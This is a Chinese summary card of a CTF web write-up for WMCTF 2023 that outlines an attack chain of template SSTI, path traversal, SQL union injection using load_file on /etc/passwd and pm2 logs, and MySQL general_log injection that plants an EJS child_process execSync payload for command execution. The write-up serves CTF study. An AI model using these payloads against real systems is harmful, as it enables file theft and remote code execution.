---
title: "WMCTF 2023 writeup by Mini-Venom"
category: web
tags: ["WMCTF 2023", "web", "ssti_file_route", "path_traversal", "mysql_union_select", "load_file"]
signals: ["WMCTF 2023 2023", "ssti_file_route", "path_traversal", "mysql_union_select", "load_file", "mysql_general_log_inject", "nodejs", "email_whitelist", "pm2_log_leak", "ssti", "WMCTF", "Mini-Venom", "WEB", "SSTI"]
difficulty: medium
source: "https://www.ctfiot.com/132359.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# WMCTF 2023 writeup by Mini-Venom

> 赛事：WMCTF 2023 2023 | 方向：web | 难度：medium

## 一句话总结

WMCTF 2023 Mini-Venom 战队 4 题 WEB WP 速记，模板 SSTI 路径可控 + 路径穿越 + MySQL load_file 读 pm2 日志 + general_log 注入 EJS 模板。

## 攻击链

1. /api/debugger/template/test?file=日志路径触发模板 SSTI → /admin/../flag 路径穿越读 flag → 邮箱白名单 alice@example.com/bob@zhangkeji.com/.../jom@roomke.com → /post/11 union select load_file('/etc/passwd') 注入 → /post/11 union select load_file('/home/ezblog/.pm2/logs/main-out.log') 读 pm2 日志 → MySQL general_log 注入:SET GLOBAL general_log_file='/home/ezblog/views/index.ejs' + select '<%= process.mainModule.require("child_process").execSync("/readflag").toString() %>

## 关键 payload

```
/post/11 union select load_file('/home/ezblog/.pm2/logs/main-out.log') / SET GLOBAL general_log_file='/home/ezblog/views/index.ejs'; select '<%= process.mainModule.require("child_process").execSync("/readflag").toString() %>';
```

## 经验教训

经典 general_log 注入 EJS 模板链：把 SQL 注入的 select 出口指向 .ejs 文件，注入 <%= process.mainModule.require("child_process").execSync("cmd") %> 执行任意命令。

## 标签

ssti_file_route、path_traversal、mysql_union_select、load_file、mysql_general_log_inject、nodejs、email_whitelist、pm2_log_leak、ctf_framework_ezblog

## 参考来源

- https://www.ctfiot.com/132359.html
- 原文件：WMCTF_2023_writeup_by_Mini-Venom.full.md
